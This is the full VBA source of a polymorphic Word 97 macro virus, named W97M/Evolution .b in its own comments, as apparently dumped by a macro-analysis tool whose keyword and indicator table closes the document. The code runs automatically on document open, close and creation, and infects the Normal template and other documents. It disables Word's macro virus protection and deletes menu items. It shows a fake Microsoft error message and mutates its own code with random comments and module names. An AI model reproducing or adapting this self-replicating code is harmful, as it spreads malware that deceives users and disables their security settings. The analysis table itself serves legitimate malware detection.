 'MeMeX
 'MP
 '
Open FileID2 For Append As #1
 '7037177
 'MeMeX
Print #1, "Sub FileNew()"
 '
 'MP
 'MeMeX
 '4247350
Print #1, "on error resume next"
 'Tester
 'JonMMx 2000
 '
 'MP
 '6676618
Print #1, "Dialogs(wdDialogFileNew)"
 'T
 'Mike Pavluschick
 '
 '9759331
 '
 'MP
 '474242
Print #1, "Call Evolution"
 'Tester
 'Kaspersky Labs.
 '
 '2037089
 '5537740
 'Mike Pavluschick
 'T
Print #1, "End Sub"
 '1613121
 'Mike Pavluschick
 '5668822
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
 'T
Close #1
 'Tester
 '105983
 'T
 'JonMMx 2000
 'Kaspersky Labs.
 'Tester
End If
 'T
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 'Tester
If PM = 90 Then
 'Tester
 'JonMMx 2000
 'T
 'MP
 'Tester
If FS_There = True Then Exit Function
 'T
 'MeMeX
 'Tester
 'MP
 '
Open FileID2 For Append As #1
 'Tester
 'Kaspersky Labs.
 '5152666
 'JonMMx2000@yahoo.com
 'T
 'Kaspersky Labs.
 'Tester
Print #1, "Sub FileSave()"
 '
 '4292766
 'T
 'JonMMx2000@yahoo.com
 '1637636
Print #1, "on error resume next"
 'Tester
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '6447142
 '6308359
 '
Print #1, "call Evolution"
 'Tester
 '5523184
 'T
 'Mike Pavluschick
 '
Print #1, "wordbasic.filesave"
 'Tester
 'MP
 'T
 'JonMMx 2000
 '8217385
 '
Print #1, "end sub"
 '5265106
 'Tester
 'Mike Pavluschick
Close #1
 '244766
 'Kaspersky Labs.
 'JonMMx 2000
 'MP
 'T
End If
 'Tester
 '1594479
 'T
If PM = 8 Then
 'T
 'Kaspersky Labs.
 'T
 '4126228
 '
 '3903606
If FSA_There = True Then Exit Function
 'MP
 'T
 'JonMMx2000@yahoo.com
 'T
 'Mike Pavluschick
 '
Open FileID2 For Append As #1
 '
 '491057
 'Tester
Print #1, "Sub FileSaveAs()"
 '1535156
 'Kaspersky Labs.
 '7114809
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 'T
Print #1, "on error resume next"
 'Tester
 '4030602
 '785437
 '9320807
 '
 'Kaspersky Labs.
 '
Print #1, "Dialogs(wdDialogFileSaveAs)"
 '4324982
 '3280884
 'T
Print #1, "Call Evolution"
 'T
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 'Tester
Print #1, "wordbasic.filesave"
 '
 '8090389
 '
Print #1, "end sub"
 '8122605
 'Kaspersky Labs.
 '6530980
 '
 'Kaspersky Labs.
 'Tester
Close #1
 '142285
 'JonMMx 2000
 '
 'Kaspersky Labs.
End If
 '8253687
 'Mike Pavluschick
 '9134488
End Function
 '3317186
 'Mike Pavluschick
 'T
 'JonMMx 2000
 'Tester
 '6693433
 '5332779
Function Norminf()
 'T
 'JonMMx2000@yahoo.com
 '1662152
 '7959307
 '
On Error Resume Next
 'T
 '8840108
 'T
 '5396188
 '3022806
 '2051311
Application.EnableCancelKey = wdCancelDisabled
 '
 'MP
Open "C:\windows\system\Export.sys" For Input As #1
 '
 'MP
 'Tester
 'JonMMx 2000
 '
Line Input #1, FileID2
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 'MP
 'Tester
Close #1
 'T
 'JonMMx2000@yahoo.com
 '
 'MP
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
 'JonMMx 2000
 'Tester
 'MP
 'T
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
 'T
 '749135
 '5700843
 'JonMMx 2000
 '
 '1756931
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
 'T
 'Kaspersky Labs.
 'Tester
 '3999232
        Open "C:\windows\system\vnames.cpl" For Append As #1
 '
 '6566437
 '7351791
 'JonMMx 2000
 '9883540
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
 '
 'Mike Pavluschick
 'T
 'MeMeX
 '
 'MP
 'Tester
        Close #1
 'T
 'Mike Pavluschick
 'T
 'JonMMx 2000
 '
 'MP
 '
        End If
 '
 '4419762
 'T
 '7669859
 'Mike Pavluschick
 'Tester
nexus:
 'Mike Pavluschick
 '6499592
 '8804651
 'T
 'MP
 '4098925
    Next l
 '
 '3026892
 '5491795
 '1209405
 'T
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
 '
 'MP
 'T
 'JonMMx2000@yahoo.com
 'Tester
End With
 '
 'Mike Pavluschick
 '459686
 'Kaspersky Labs.
 '
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
 'Tester
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
 'T
 'MP
 'T
End Function
 '2833051
 'JonMMx2000@yahoo.com
 '
Function FileInft()
 'T
On Error Resume Next
 '7896548
 '1336401
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 '
 '9225182
 '
 'JonMMx2000@yahoo.com
 'T
 '232979
 'T
Open "C:\windows\system\Export.sys" For Input As #1
 '
 '5558640
 'JonMMx 2000
 'Tester
 '5042484
 '
Line Input #1, FileID2
 'T
 'JonMMx2000@yahoo.com
 '
 '7832311
Close #1
 '1761017
 '
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 'Tester
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
 '
 'JonMMx2000@yahoo.com
 '
 '5300562
 '325817
End With
 'Tester
 'JonMMx 2000
 'T
Randomize Timer
 'T
 'Mike Pavluschick
 'T
WD = Int(Rnd(1) * 8) + 2
 'T
 'MP
 'MeMeX
For evo = 2 To WD
 'Tester
 'JonMMx 2000
 '4381518
 '5427558
 '
x = Int(Rnd(1) * 26)
 '7949665
If x = 1 Then a$ = "A"
 'MP
 '739493
 'JonMMx 2000
 '
 '2015009
 'T
If x = 2 Then a$ = "B"
 'Tester
 'Kaspersky Labs.
 '6552709
 'MeMeX
 'Tester
If x = 3 Then a$ = "C"
 '7818583
 '5554554
 'Tester
 'JonMMx 2000
 'Mike Pavluschick
 '2882081
If x = 4 Then a$ = "D"
 '
If x = 5 Then a$ = "E"
 '
 '5654266
 '4034688
 'Tester
If x = 6 Then a$ = "F"
 'T
 'Mike Pavluschick
 'MeMeX
 'T
 'Kaspersky Labs.
If x = 7 Then a$ = "G"
 'T
 'JonMMx2000@yahoo.com
 '608411
 'Kaspersky Labs.
 '1616207
If x = 8 Then a$ = "H"
 '6941868
 'Kaspersky Labs.
 '6425713
 '2241717
 'Kaspersky Labs.
 'Tester
If x = 9 Then a$ = "I"
 'T
 '5685636
 '
 'JonMMx2000@yahoo.com
 '7634718
 'Mike Pavluschick
 'T
If x = 10 Then a$ = "J"
 '
 'Kaspersky Labs.
 '
 'MeMeX
 '1432342
 'Kaspersky Labs.
If x = 11 Then a$ = "K"
 '
 '9483259
 '
 '5781262
 'T
 '364061
 'T
If x = 12 Then a$ = "L"
 '2571220
 '4546758
 '6626921
 'MeMeX
 'Tester
 'MP
 'Tester
If x = 13 Then a$ = "M"
 'Tester
 '622139
 'T
 'JonMMx 2000
 'Kaspersky Labs.
 'Tester
If x = 14 Then a$ = "N"
 'T
 'Mike Pavluschick
 '
If x = 15 Then a$ = "O"
 'Tester
 'Mike Pavluschick
 'Tester
If x = 16 Then a$ = "P"
 'T
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'T
 'Mike Pavluschick
 'Tester
If x = 17 Then a$ = "Q"
 '
 'MP
 'Tester
 'JonMMx 2000
 '6110765
If x = 18 Then a$ = "R"
 'Tester
 'JonMMx2000@yahoo.com
If x = 19 Then a$ = "S"
 'T
 'Kaspersky Labs.
 'Tester
 'MeMeX
If x = 20 Then a$ = "T"
 'Tester
 '2768814
 'T
 'JonMMx2000@yahoo.com
 'Mike Pavluschick
If x = 21 Then a$ = "U"
 '4328735
 'MP
 'T
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 '916186
If x = 22 Then a$ = "V"
 '
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '4455731
If x = 23 Then a$ = "W"
 'T
 '4161684
 '5912344
 'Mike Pavluschick
If x = 24 Then a$ = "X"
 'Tester
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 '
 'Kaspersky Labs.
 'T
If x = 25 Then a$ = "Y"
 '
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 '4586813
If x = 26 Then a$ = "Z"
 'Tester
 'MP
 '
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 '8384436
VrusName = VrusName + a$
 '9265236
 '9709967
 'Tester
 'MP
Next evo
 'Mike Pavluschick
 'T
 '590768
 '
 '9098185
 'T
Open "C:\windows\system\vnames.cpl" For Input As #1
 '3153888
 '1952583
 '4773465
 '4484332
 'MP
 '
Do
 '
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 'Tester
Line Input #1, Virname
 '3603532
 '848846
 '3087376
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
 'Kaspersky Labs.
 '5877203
 '4904547
 '9805908
 'Mike Pavluschick
' RAPE v1.2 Macro Virus Name Randomizer - 2 to 8 letters
 'MP
 '3345454
 'MeMeX
 'Mike Pavluschick
 '9547830
Loop Until EOF(1)
 'Tester
 'Kaspersky Labs.
 'MeMeX
 'MP
 '
Close #1
 'T
 'MeMeX
 'MP
 'T
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
 '9356263
 'T
 'MeMeX
 'Kaspersky Labs.
 'T
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 'Tester
 '2637732
 'Tester
 'JonMMx 2000
 '3369969
 'MP
 'T
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 'T
 '6824515
 '
rite:
 '
 '6435355
 'JonMMx 2000
 'T
 'Mike Pavluschick
Open "C:\windows\system\vnames.cpl" For Append As #1
 '4288680
 '844760
 'Tester
 'MP
 'Tester
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '
 'MP
Close #1
 'Kaspersky Labs.
 'Tester
 'JonMMx 2000
 'T
 '3514446
 'Tester
nex:
 '9445349
 'Mike Pavluschick
 'T
 'MeMeX
 '2108181
 'MP
 'Tester
Next x
 'MP
 '
 'MeMeX
 '1096298
 'MP
 '
End Function
 '2235177
 'MP
 'T
 'JonMMx 2000
 '3129372
 '
Function Evolution()
 '6811120
 'Mike Pavluschick
 'Tester
 '2110635
 'Tester
 '7570147
 'Tester
On Error Resume Next
 'Tester
 '4388391
 '
 'Mike Pavluschick
 '3013497
Application.EnableCancelKey = wdCancelDisabled
 'T
 'MP
 'Tester
 'MeMeX
 'Tester
 'MP
 '
Call Self_Recognition
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'T
 '8836022
 '
Call Armor_Status
 '1113779
 'T
 '7514261
 'Mike Pavluschick
 '3398571
Call Export_Code
 '7454272
 'Mike Pavluschick
 'Tester
 'MeMeX
 'Kaspersky Labs.
 'Tester
Call Payload
 'Mike Pavluschick
 '8907132
 '
 'Mike Pavluschick
Call Polymorphic_Check
 'Tester
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '
 'MP
 '
Call Evolve
 'Mike Pavluschick
 'T
 'JonMMx2000@yahoo.com
 '782351
 'MP
 '
If Hostinf = False Then Call Norminf
 '4063818
 '9331748
 'T
 'MeMeX
 '8250601
 'MP
 '7861441
If FileInf = False Then Call FileInft
 'Tester
 'Kaspersky Labs.
 '5714766
 'JonMMx 2000
 'T
 '5919199
 '8377597
Options.VirusProtection = False
 '7053991
 '3056022
 'JonMMx2000@yahoo.com
 '
 '9458744
 '
Options.ConfirmConversions = False
 '
 'Kaspersky Labs.
 '
Options.SaveNormalPrompt = False
 'Tester
 'Mike Pavluschick
 'Tester
 'MeMeX
 'T
 'MP
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
 'Tester
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 '
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 '
 'Mike Pavluschick
 'T
 'JonMMx 2000
 '9585740
 'Tester
' W97M/Evolution
 '
 'Kaspersky Labs.
 'T
 'JonMMx2000@yahoo.com
 '7312069
' W97M/Evolution .b Variant by Nex and Error
 'T
 '9589826
 'JonMMx 2000
 'MP
 'T
' Polymorphic Stealth Word97 Macro Virus
 'Tester
 'Kaspersky Labs.
 'MeMeX
 'Tester
 'Kaspersky Labs.
 '
' All Things Must Change...
 '
 '3387450
 'Tester
 '6248387
 'T
 'Mike Pavluschick
 '
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error
 'Tester
 '1240775
 '
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 '
' RAPE v1.2 does:
 'Kaspersky Labs.
 'T
 'MeMeX
' Randomly Morphs Source Code by Adding Random Remarks now even better
 'Tester
 '1311885
 '8582030
 'T
' Randomly Selects Source Code Export File - Then Morphs it
 'MP
 'JonMMx 2000
 '7033757
 'MP
' Randomly Creates Virus Macro Name
 'MP
 'Tester
 'JonMMx2000@yahoo.com
 '
 'MP
 '5898965
' Randomly Adds 1 to 6 Commands to Code
 'Mike Pavluschick
 'Tester
End Function
 '
 'MP
 '
 'JonMMx 2000
 'MP
 'Tester
Sub AutoClose()
 '4502009
 '4522243
 'Tester
 'JonMMx 2000
 'T
 'Mike Pavluschick
 'Tester
On Error Resume Next
 '8172636
 'Kaspersky Labs.
 '9307428
 'MeMeX
 '1712182
 'MP
 '
Application.EnableCancelKey = wdCancelDisabled
 '962463
 'MP
 '
 'MeMeX
 '
 'Mike Pavluschick
Call Evolution
 '1839178
 '5788117
 '
 'JonMMx2000@yahoo.com
WordBasic.filesave
 '
 '9847904
 '7939073
 'JonMMx 2000
 'T
 'Mike Pavluschick
 'Tester
End Sub
 '
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
 'T
Sub AutoExec()
 '
 'MP
 'T
 'MeMeX
 'T
 'Kaspersky Labs.
On Error Resume Next
 '9716822
 '
 'JonMMx2000@yahoo.com
 '6931277
 'MP
 '
Application.EnableCancelKey = wdCancelDisabled
 'Mike Pavluschick
 '
 'MeMeX
 'Mike Pavluschick
 'T
Call Armor_Status
 '
 '5038399
 'T
Options.VirusProtection = False
 'Tester
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 '
 'Kaspersky Labs.
 'T
Options.ConfirmConversions = False
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 '
Options.SaveNormalPrompt = False
 '
 'Mike Pavluschick
 '
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
 '6415121
 'MP
 'Tester
 'MeMeX
 '
 'Kaspersky Labs.
 '
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 '212745
 'MP
 '1093545
 'JonMMx 2000
 '5276242
 'MP
 'T
End Sub
 '1351623
 'MP
 '5407324
Sub AutoExit()
 'T
 'Kaspersky Labs.
 'T
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 'T
On Error Resume Next
 '3974716
 '6304273
Application.EnableCancelKey = wdCancelDisabled
 '
 '6506465
 'Tester
Call Evolution
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 'T
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
 'Tester
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
 'JonMMx2000@yahoo.com
 '5715100
 'Mike Pavluschick
 'T
If PMFile_Yes = True Then Exit Sub
 '3314433
 'Kaspersky Labs.
 '
 'JonMMx 2000
 '4707303
 'Mike Pavluschick
 '
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
 '
 '8192870
 'T
 'MeMeX
 'Tester
 '3772524
 '
Print #1, "W97M/Evolution .b by Nex"
 'Mike Pavluschick
 'T
 'MeMeX
 '
 'MP
 'Tester
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error"
 '
 'Mike Pavluschick
 'T
 '5109509
 'T
 '7443151
 '2048558
Close #1
 '
 '8577944
 '
Open "C:\windows\system\Export.sys" For Input As #2
 '7112056
 '982697
 'Tester
 '7899335
 '
 'MP
 'Tester
Line Input #2, FileID
 'Tester
 'MP
 'Tester
 'JonMMx2000@yahoo.com
 'T
Close #2
 'Kaspersky Labs.
 'Tester
 'MeMeX
 '
 'MP
 '3982100
Open FileID For Append As #9
 'Kaspersky Labs.
Print #9, "' EOF"
 '
 'Kaspersky Labs.
 '7525731
 '3712552
 '
 '4780321
Close #9
 '9541324
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
 'T
Open FileID For Input As #3
 'T
 'Mike Pavluschick
 'T
 '4978427
 '
Randomize Timer
 'Tester
 '3645528
 'MeMeX
 'Tester
W = Int(Rnd(1) * 5) + 1
 '3597026
 '4911402
 'JonMMx2000@yahoo.com
 'T
For vir = 1 To W
 'T
 'Mike Pavluschick
 'T
x = Int(Rnd(1) * 26)
 'T
 '9974900
 '4862900
 'JonMMx 2000
 'Kaspersky Labs.
 '
If x = 1 Then a$ = "A"
 'Tester
 'Mike Pavluschick
 'T
If x = 2 Then a$ = "B"
 'Tester
 '1990494
 '7034091
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 'T
If x = 3 Then a$ = "C"
 '2097589
 '8319866
 '7550246
 'JonMMx 2000
 '851615
 'T
If x = 4 Then a$ = "D"
 'T
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '
If x = 5 Then a$ = "E"
 '8709026
 '
 'JonMMx2000@yahoo.com
 '9823917
 'Kaspersky Labs.
 '831715
If x = 6 Then a$ = "F"
 '6157376
 'JonMMx 2000
 'Tester
If x = 7 Then a$ = "G"
 '
 'MP
 '7280699
 '
 '3256368
 'T
If x = 8 Then a$ = "H"
 'Tester
 'MP
 '
 '9685452
 '3494545
 'Mike Pavluschick
 '
If x = 9 Then a$ = "I"
 'Tester
 'Kaspersky Labs.
 'Tester
 'MeMeX
 '
 'Kaspersky Labs.
 'T
If x = 10 Then a$ = "J"
 '2121576
If x = 11 Then a$ = "K"
 '
 'Mike Pavluschick
 'JonMMx 2000
 'Tester
 'MP
 'Tester
If x = 12 Then a$ = "L"
 'Kaspersky Labs.
 '
If x = 13 Then a$ = "M"
 '2387688
 'Kaspersky Labs.
 '4919437
 'MeMeX
 'T
 'Mike Pavluschick
 '
If x = 14 Then a$ = "N"
 '
 'MP
 'Tester
 'MeMeX
 'T
 '724619
 'T
If x = 15 Then a$ = "O"
 '3522480
 'Kaspersky Labs.
 '9812448
 '6312307
 'MP
 '
If x = 16 Then a$ = "P"
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 'Tester
 '4395247
 'Tester
If x = 17 Then a$ = "Q"
 '
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 'T
 'MP
 '
If x = 18 Then a$ = "R"
 '
 'Kaspersky Labs.
 'Tester
 'MeMeX
 'T
 'Mike Pavluschick
If x = 19 Then a$ = "S"
 'Mike Pavluschick
 'T
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 '4558878
If x = 20 Then a$ = "T"
 '5693670
 '8426432
 '8098423
If x = 21 Then a$ = "U"
 '
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'T
 'MP
 'T
If x = 22 Then a$ = "V"
 '
 'MP
 'T
 'JonMMx2000@yahoo.com
 '8225419
 'Kaspersky Labs.
 '
If x = 23 Then a$ = "W"
 '5951748
 'MP
 'MeMeX
 'Tester
 '9692307
 '
If x = 24 Then a$ = "X"
 '
 'JonMMx2000@yahoo.com
 '3546996
 'Kaspersky Labs.
 'T
If x = 25 Then a$ = "Y"
 '5099549
 'MP
 'T
If x = 26 Then a$ = "Z"
 'MP
 'Tester
Filename = Filename + a$
 '
 '7287554
 '
 'JonMMx2000@yahoo.com
 'T
 'MP
Next vir
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '3621013
F = Int(Rnd(1) * 999) + 1
 '912766
 'Kaspersky Labs.
 'JonMMx 2000
 'T
 'MP
 '7246224
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
 'Tester
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
Open FileID2 For Append As #4
 '9519895
 '689163
 '3448601
Do
 'T
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '6988146
 'Mike Pavluschick
inpux:
 'MP
 'Tester
 'JonMMx 2000
 'T
 'Mike Pavluschick
Line Input #3, stuff
 'MP
 '7115142
 'MeMeX
 'T
 '6021680
 'T
Print #4, stuff
 '3702593
 'Kaspersky Labs.
 'T
 'MeMeX
 'MP
 'T
    Randomize Timer
 '9388813
 '1085178
 '396610
 'MeMeX
 '
 'Mike Pavluschick
    t = Int(Rnd(1) * 5) + 1
 'Kaspersky Labs.
 'T
 'JonMMx2000@yahoo.com
    If t = 1 Then Z$ = " '" & Application.UserName
 'Tester
 '8168354
 'T
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'Tester
    If t = 3 Then Z$ = " '" & Application.UserAddress
 '
 'MP
 '3059441
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
 'Tester
    If t = 4 Then Z$ = " '" & Int(Rnd(1) * 9999999) + 1
 'T
 '4748950
 '5763602
 '
    If t = 5 Then GoTo inpux
 'Tester
 'MP
 'T
    Print #4, Z$
 'MP
 'Tester
 'MeMeX
 '
' Source Code Morpher - adds random remarks to Code (RAPE v1.2 by Error)
 '8249935
 'MeMeX
 'Tester
 'Kaspersky Labs.
 '
Loop Until stuff = "' EOF"
 '
 'MeMeX
 '
Close #3
 '
 'Mike Pavluschick
 'T
 'MeMeX
 'Tester
Close #4
 'T
 'Kaspersky Labs.
 '6014824
 'T
 '3748009
 'Tester
Kill "C:\windows\system\export.sys"
 'T
 '6279757
 '
Open "C:\windows\system\Export.sys" For Append As #5
 '
 'MP
 'T
 'JonMMx2000@yahoo.com
 'MP
 'T
Print #5, FileID2
 'Kaspersky Labs.
 '7631298
 'MeMeX
 'T
 'Mike Pavluschick
 '5230631
Close #5
 'T
 'MP
 '6623502
 'MeMeX
 '
 'MP
 '
End Sub
 'T
 '4882801
 'Tester
 '3610072
 '
 '8684510
 'T
Sub AutoNew()
 '
 'Mike Pavluschick
 '2256939
 'MeMeX
 '4788688
 'MP
 '
On Error Resume Next
 'Tester
 'MP
 'JonMMx2000@yahoo.com
 '9983267
Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 'T
 '5140879
Call Evolution
 'T
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 'T
 '1343256
 '
End Sub
 '1245057
 'JonMMx2000@yahoo.com
 'T
 'Kaspersky Labs.
 'T
Sub AutoOpen()
 '
 '6152761
 '9852185
On Error Resume Next
 'Tester
 'MP
 '
Application.EnableCancelKey = wdCancelDisabled
 '5894684
 'T
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 '
Call Evolution
 'T
 '2224056
 'JonMMx2000@yahoo.com
 'Tester
 '4755805
 'Tester
End Sub
 'Tester
 'Kaspersky Labs.
 'Tester
Sub FileTemplates()
 '2305970
 'Mike Pavluschick
 '3313766
 'MeMeX
 '
 'Kaspersky Labs.
 '
Application.EnableCancelKey = wdCancelDisabled
 '8123272
 '9950385
 '4232794
 '913099
End Sub
 '
 '3358849
 'T
Sub ToolsCustomize()
 'Tester
 '7160558
 '6726315
 'JonMMx 2000
 'Tester
 'Mike Pavluschick
 '7992190
Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'Mike Pavluschick
 'T
 '2344197
 '3055688
 'MP
 '8508346
End Sub
 'Kaspersky Labs.
 'T
 'MeMeX
 'T
Sub ToolsMacro()
 'Mike Pavluschick
 '
 'MeMeX
 'Mike Pavluschick
 '
Application.EnableCancelKey = wdCancelDisabled
 '782018
 'MP
 '1789814
 '7407695
 '7115475
 '9819303
 'Tester
End Sub
 '
 'Mike Pavluschick
 '6764543
 'T
 'Mike Pavluschick
 'T
Sub ViewVBCode()
 '9413662
 '4628809
 'T
 '9423288
 '
 'MP
Application.EnableCancelKey = wdCancelDisabled
 '8147787
 'Kaspersky Labs.
 'T
 '3351994
 'T
 'MP
End Sub
 'MeMeX
 '
 '700104
' "The most polymorphic Macro Virus to date...." - NAI
 '3231853
 'Tester
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
 '
' EOF
 '6132194
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |import.exe          |Executable file name                         |
|IOC       |data101.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

